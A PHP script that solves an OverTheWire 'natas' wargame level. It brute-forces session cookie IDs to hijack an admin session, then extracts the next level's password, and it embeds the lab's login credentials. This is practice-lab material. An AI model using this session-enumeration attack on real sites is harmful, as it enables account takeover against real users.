<?php

function get($url, $i)
{
    $username = "natas18";
    $password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP";
    $string = base64_encode("$username:$password");

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n"
                       . "authorization: Basic $string\r\n"
                       . "cookie: PHPSESSID=$i",
            'method'  => 'GET'
        ]
    ];

    $context  = stream_context_create($options);
    $raw_response = file_get_contents($url, false, $context);
    return $raw_response;
}

for ($i = 0; $i < 641; $i++)
{
    echo "Checking $i\r\n";
    $response = get("http://natas18.natas.labs.overthewire.org", $i);
    if (strpos($response, "You are an admin."))
    {
        $password = substr($response, strpos($response, "Password: ") + 10, 32);
        exit("Got it! Session ID $i is Admin.\r\nNatas19 Password: $password");
    }
    elseif (!strpos($response, "You are logged in as a regular user."))
    {
        var_dump($response);
    }
}